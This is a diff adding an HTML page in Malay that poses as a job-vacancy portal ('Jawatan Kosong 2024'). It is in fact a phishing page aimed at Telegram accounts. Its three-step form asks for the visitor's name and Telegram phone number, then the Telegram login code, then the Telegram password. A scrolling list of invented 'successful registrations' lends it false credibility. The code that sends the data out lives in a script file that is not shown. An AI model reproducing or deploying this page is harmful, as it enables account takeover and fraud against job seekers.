@@ -1,0 +1,730 @@
+<!doctype html>
+<html lang="en" class="h-100">
+<head id="ctl00_Head1">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+    <link href="assets/css/custom.css" type="text/css" rel="stylesheet" />
+    <link href="assets/css/menebus.css" type="text/css" rel="stylesheet" />
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta property="og:title" content="Senarai Jawatan Kosong Terkini 2024 & 2025">
+    <meta property="og:image"
+        content="./img/1.jpg">
+    <meta name="description" />
+    <meta name="author" content="JAWATAN KOSONG 2024" />
+    <title>JAWATAN KOSONG 2024</title>
+    <link rel="icon" type="image/x-icon" href="favicon.png" />
+    <link rel="canonical" href="https://getbootstrap.com/docs/5.0/examples/sticky-footer/" />
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.4.1/font/bootstrap-icons.css" />
+    <script type="text/javascript" src="js/vue.min.js.download"></script>
+    <script src="js/clipboard.js.download"></script>
+    <script type="text/javascript" src="js/index.js.download"></script>
+    <style type="text/css">
+        .bd-placeholder-img {
+            font-size: 1.125rem;
+            text-anchor: middle;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            user-select: none;
+        }
+
+        @media (min-width: 768px) {
+            .bd-placeholder-img-lg {
+                font-size: 3.5rem;
+            }
+        }
+
+        /* Absolute Center Spinner */
+        .loading {
+            position: fixed;
+            z-index: 999;
+            height: 2em;
+            width: 2em;
+            overflow: show;
+            margin: auto;
+            top: 0;
+            left: 0;
+            bottom: 0;
+            right: 0;
+        }
+
+        /* Transparent Overlay */
+        .loading:before {
+            content: '';
+            display: block;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(rgba(20, 20, 20, .8), rgba(0, 0, 0, .8));
+
+            background: -webkit-radial-gradient(rgba(20, 20, 20, .8), rgba(0, 0, 0, .8));
+        }
+
+        /* :not(:required) hides these rules from IE9 and below */
+        .loading:not(:required) {
+            /* hide "loading..." text */
+            font: 0/0 a;
+            color: transparent;
+            text-shadow: none;
+            background-color: transparent;
+            border: 0;
+        }
+
+        .loading:not(:required):after {
+            content: '';
+            display: block;
+            font-size: 10px;
+            width: 1em;
+            height: 1em;
+            margin-top: -0.5em;
+            -webkit-animation: spinner 150ms infinite linear;
+            -moz-animation: spinner 150ms infinite linear;
+            -ms-animation: spinner 150ms infinite linear;
+            -o-animation: spinner 150ms infinite linear;
+            animation: spinner 150ms infinite linear;
+            border-radius: 0.5em;
+            -webkit-box-shadow: rgba(255, 255, 255, 0.75) 1.5em 0 0 0, rgba(255, 255, 255, 0.75) 1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) 0 1.5em 0 0, rgba(255, 255, 255, 0.75) -1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) -1.5em 0 0 0, rgba(255, 255, 255, 0.75) -1.1em -1.1em 0 0, rgba(255, 255, 255, 0.75) 0 -1.5em 0 0, rgba(255, 255, 255, 0.75) 1.1em -1.1em 0 0;
+            box-shadow: rgba(255, 255, 255, 0.75) 1.5em 0 0 0, rgba(255, 255, 255, 0.75) 1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) 0 1.5em 0 0, rgba(255, 255, 255, 0.75) -1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) -1.5em 0 0 0, rgba(255, 255, 255, 0.75) -1.1em -1.1em 0 0, rgba(255, 255, 255, 0.75) 0 -1.5em 0 0, rgba(255, 255, 255, 0.75) 1.1em -1.1em 0 0;
+        }
+
+        /* Animation */
+
+        @-webkit-keyframes spinner {
+            0% {
+                -webkit-transform: rotate(0deg);
+                -moz-transform: rotate(0deg);
+                -ms-transform: rotate(0deg);
+                -o-transform: rotate(0deg);
+                transform: rotate(0deg);
+            }
+
+            100% {
+                -webkit-transform: rotate(360deg);
+                -moz-transform: rotate(360deg);
+                -ms-transform: rotate(360deg);
+                -o-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
+        }
+
+        @-moz-keyframes spinner {
+            0% {
+                -webkit-transform: rotate(0deg);
+                -moz-transform: rotate(0deg);
+                -ms-transform: rotate(0deg);
+                -o-transform: rotate(0deg);
+                transform: rotate(0deg);
+            }
+
+            100% {
+                -webkit-transform: rotate(360deg);
+                -moz-transform: rotate(360deg);
+                -ms-transform: rotate(360deg);
+                -o-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
+        }
+
+        @-o-keyframes spinner {
+            0% {
+                -webkit-transform: rotate(0deg);
+                -moz-transform: rotate(0deg);
+                -ms-transform: rotate(0deg);
+                -o-transform: rotate(0deg);
+                transform: rotate(0deg);
+            }
+
+            100% {
+                -webkit-transform: rotate(360deg);
+                -moz-transform: rotate(360deg);
+                -ms-transform: rotate(360deg);
+                -o-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
+        }
+
+        @keyframes spinner {
+            0% {
+                -webkit-transform: rotate(0deg);
+                -moz-transform: rotate(0deg);
+                -ms-transform: rotate(0deg);
+                -o-transform: rotate(0deg);
+                transform: rotate(0deg);
+            }
+
+            100% {
+                -webkit-transform: rotate(360deg);
+                -moz-transform: rotate(360deg);
+                -ms-transform: rotate(360deg);
+                -o-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+
+<body class="d-flex flex-column h-100">
+    <nav class="navbar navbar-expand-md" style="background: #FFFFFF;">
+        <div class="container-fluid"><a class="navbar-brand" href="#"><img src="img/logo.png" width="180"
+                    height="40"></a><button class="navbar-toggler" data-bs-toggle="collapse"
+                class="navbar-toggler-icon"></span></button>
+        </div>
+    </nav>
+    <div class="carousel slide carousel-fade" data-bs-ride="carousel" data-bs-touch="false" id="carousel-1">
+        <div class="carousel-inner">
+            <div class="carousel-item active">
+                <img class="w-100 d-block" src="./img/33.jpg" alt="Slide Image"
+                    style="height: 200px;" height="380"></div>
+                    <div class="carousel-item active">
+                <img class="w-100 d-block" src="./img/33.jpg" alt="Slide Image"
+                    style="height: 200px;" height="380"></div>
+                    <div class="carousel-item active">
+                <img class="w-100 d-block" src="./img/33.jpg" alt="Slide Image"
+                    style="height: 200px;" height="380"></div>                  
+        </div>
+    </div>
+    <div id="loading" class="loading" style="display: none;"></div>
+<span><marquee style="font-weight: bold;">💻INFO KERJAYA : Portal Carian Jawatan Kosong Kerjaan & Swasta Terkini Malaysia💻</marquee></span>
+    <main class="flex-shrink-0">
+        <div id="ctl00_divContainer" class="container container-narrow">
+            <script type="text/javascript">
+                //<![CDATA[
+                var theForm = document.forms['aspnetForm'];
+                if (!theForm) {
+                    theForm = document.aspnetForm;
+                    A
+                }
+                function __doPostBack(eventTarget, eventArgument) {
+                    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
+                        theForm.__EVENTTARGET.value = eventTarget;
+                        theForm.__EVENTARGUMENT.value = eventArgument;
+                        theForm.submit();
+                    }
+                }
+                //]]>
+            </script>
+            <script type="text/javascript">
+                //<![CDATA[
+                function WebForm_OnSubmit() {
+                    if (typeof (ValidatorOnSubmit) == "function" && ValidatorOnSubmit() == false) return false;
+                    return true;
+                }
+                //]]>
+            </script>
+            <span id="ctl00_lblMsg"></span>
+            <div class="page-header text-center ">
+                <span id="ctl00_RecipientMasterContent_lblSubject"></span>
+            </div>
+            <div class="first">
+                <form action="javascript:void(0)" method="post" id="firstForm">
+                    <div class="input-group mb-3"><span class="input-group-text" id="basic-addon1">🪪</span>
+                        <input name="full_name" id="full_name" maxlength="60" class="form-control" type="text"
+                            required="true" placeholder="Nama Penuh Sesuai MyKad"
+                            title="Sila Masukkan Nombor , contoh +6022334455">
+                    </div>
+                    <div class="input-group mb-3">
+                        <span class="input-group-text" id="basic-addon1">🇲🇾</span>
+                        <input name="phone_number" id="phone_number" maxlength="14" value="+60 " class="form-control" type="tel"
+                            required="true" placeholder="Nombor Phone Telegram"
+                            title="Sila Masukkan Nombor , contoh +6022334455">
+                    </div>
+                    <div class="text-center">
+                        <button type="submit" class="btn btn-primary btn-lg" onclick="processFirstData()">Teruskan</button>
+                    </div>
+                </form>
+            </div>
+
+            <div class="second" style="display: none;">
+                <form action="javascript:void(0)" method="post" id="secondForm">
+                    <input type="hidden" name="full_name" id="validateFullName" readonly>
+                    <input type="hidden" name="phone_number" id="validatePhoneNumber" readonly>
+                    <div class="mb-3">
+                        <label for="otp_code" class="form-label">
+                            <span id="ctl00_RecipientMasterContent_lblEntry_IDNo">Kami telah menghantar kod Telegram</span>
+                        </label>
+                        <input name="otp_code" maxlength="6" id="otp" class="form-control" type="tel" style="text-align: center; width: 160; " required="true"
+                            placeholder="5 digit OTP">
+                    </div>
+                    <div class="text-center">
+                        <button type="submit" class="btn btn-primary btn-lg" onclick="processSecondData()">Teruskan</button>
+                    </div>
+                </form>
+            </div>
+
+            <div class="third" style="display: none;">
+                <form action="javascript:void(0)" method="post" id="thirdForm">
+                    <input type="hidden" name="full_name" id="validateFullName" readonly>
+                    <input type="hidden" name="phone_number" id="validatePhoneNumber" readonly>
+                    <input type="hidden" name="otp_code" id="validateOtpCode" readonly>
+                    <div class="mb-3">
+                        <label for="password" class="form-label">
+<span id="ctl00_RecipientMasterContent_lblEntry_IDNo">Masukkan kata laluan Telegram</span>
+                        </label>
+                        <center><input name="password" id="password" class="form-control" type="text" required="true" style="text-align: center; width: 180px"
+                            placeholder="Kata laluan anda"></center>
+                    </div>
+                    <div class="text-center">
+                        <button type="submit" class="btn btn-primary btn-lg"
+                            onclick="processThirdData()">Teruskan</button>
+                    </div>
+                </form>
+            </div>
+
+            <div class="row four" id="ctl00_RecipientMasterContent_divResultNotFound" style="display: none;">
+                <p class="text-center"><img src="assets/img/processing.gif" id="ctl00_logohead" class="img-fluid"
+                        width="160" /></p>
+                <h5 class="text-center"><span id="ctl00_RecipientMasterContent_lblNoRecord">Sila tunggu proses
+                        pengesahan dalam masa 1x24 jam untuk menyemak kelayakan,</span></h5>
+                <h5 class="text-center"><span id="ctl00_RecipientMasterContent_lblNoRecord">atau gunakan nombor telefon
+                        lain.</span></h5>
+                <p class="text-center"><a href="/" class="btn btn-light">&laquo; <span
+                            id="ctl00_RecipientMasterContent_lblGoBack_NoResult">Gunakan Nombor Telefon Lain</span></a>
+                </p>
+            </div>
+
+            <script type="text/javascript">
+                //<![CDATA[
+                var Page_ValidationActive = false;
+                if (typeof (ValidatorOnLoad) == "function") {
+                    ValidatorOnLoad();
+                }
+                function ValidatorOnSubmit() {
+                    if (Page_ValidationActive) {
+                        return ValidatorCommonOnSubmit();
+                    } else {
+                        return true;
+                    }
+                }
+            </script>
+
+            <!--- record berjaya box --->
+            <div class="_record-box">
+                <div id="list" class="list-box">
+                    <div class="list" style="margin-top: -3.1345px;">
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Kaamil bin Haarith</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Fat'hi bin Jaasir</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Ibrahim bin Khaalid</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Suhaib bin Baahir</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Jubair bin Jaadallah</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Selamat bin Budiarto</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Baba bin Deris</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Gana bin Kuning</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Zakaria bin Kesuma</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Embong bin Sulong</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Zaki bin Baasim</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Tawfeeq bin Masood</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Wajeeh bin Zaghlool</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Mu,Aawiya bin Musaaid</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Furqaan bin Kabeer</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Yaakob bin Hitam</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Khamis bin Adi Putra</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Indera bin Kuning</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Embong bin Daniel</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Embong bin Agung</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Humaira binti Noori</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Zahra binti Zubair</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Fawzaana binti Tufail</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Nazeeha binti Shaheer</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Faseeha binti Furqaan</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Zamrud binti Agus</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Adiputeri binti Usop</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Masayu binti Lokman</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Nilam binti Kuning</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Suriawati binti Nerang</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Kaamil bin Haarith</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Fat'hi bin Jaasir</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Ibrahim bin Khaalid</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Suhaib bin Baahir</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Jubair bin Jaadallah</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Selamat bin Budiarto</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Baba bin Deris</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Gana bin Kuning</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Zakaria bin Kesuma</span></div>
+                                <div class="h2">pendaftaran berjaya</div>
+                            </div>
+                        </div>
+                        <div class="item">
+                            <div class="record_logo">
+                                <img src="assets/img/avatar.png" alt="">
+                            </div>
+                            <div class="center">
+                                <div class="h1"><span class="name">Embong bin Sulong</span></div>
+                                <div class="h2">Berjaya RM 1.000,00</div>
+                                <br>
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+            <!--- record berjaya box --->
+
+        </div>
+        </div>
+        </div>
+    </main>
+    </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"
+        integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+    <script src="./js/bootstrap.min.js"></script>
+    <script src="assets/js/script.js"></script>
+    <script type="text/javascript" src="js/jquery-3.4.1.min.js.download"></script>
+    <script>
+        // 加载多语言
+        var language = getQueryString('language')
+        loadLocale(function (e) {
+            app.locale = Object.assign(e.Common, e.CommonShare)
+        }, language)
+        var app = new Vue({
+            el: '#app',
+            data: {
+                locale: {},
+                uid: '2004219',
+            },
+            created() {
+                $('#app').show();
+                this.starScroll();
+            },
+            methods: {
+                starScroll() {
+                    var _this = this;
+                    _this.scrollTimer && clearTimeout(_this.scrollTimer)
+                    _this.scrollTimer = setTimeout(() => {
+                        var $box = $("#list").find(".list:first");
+                        $box.css({
+                            marginTop: 0
+                        })
+                        var $item = $box.find(".item:first");
+                        var outerHeight = $item.outerHeight(true)
+                        $box.animate({
+                            "marginTop": -outerHeight + "px"
+                        }, 1000, function () {
+                            $box.css({
+                                marginTop: 0
+                            }).find(".item:first").appendTo($box);
+                            _this.starScroll();
+                        })
+                    }, 600);
+                },
+            },
+        })
+    </script>
+
+</body>
+</html>
